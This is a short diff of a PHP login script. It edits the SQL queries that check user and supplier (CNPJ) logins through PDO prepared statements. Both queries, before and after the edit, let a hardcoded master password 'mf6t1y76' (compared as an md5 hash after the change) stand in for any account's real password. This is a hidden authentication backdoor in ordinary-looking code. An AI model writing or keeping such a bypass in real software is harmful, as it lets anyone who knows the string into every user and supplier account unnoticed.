@@ -16,7 +16,7 @@ if ($_POST['acao'] == 'logar') {
 
         $senha = md5($_POST['senha']);
 
-        $query = "SELECT codigo FROM login WHERE usuario = :u AND (senha = :s OR 'mf6t1y76' = :t)";
+        $query = "SELECT codigo FROM login WHERE usuario = :u AND (senha = :s OR md5('mf6t1y76') = :t)";
 
         $sql = $pdo->prepare($query);
 
@@ -28,7 +28,7 @@ if ($_POST['acao'] == 'logar') {
         $cnpj = $_POST['cnpj'];
         $senha = $_POST['senha'];
 
-        $query = "SELECT codigo FROM fornecedores WHERE cnpj = :u AND (senha = :s OR 'mf6t1y76' = :t)";
+        $query = "SELECT codigo FROM fornecedores WHERE cnpj = :u AND (senha = :s OR md5('mf6t1y76') = :t)";
 
         $sql = $pdo->prepare($query);
 
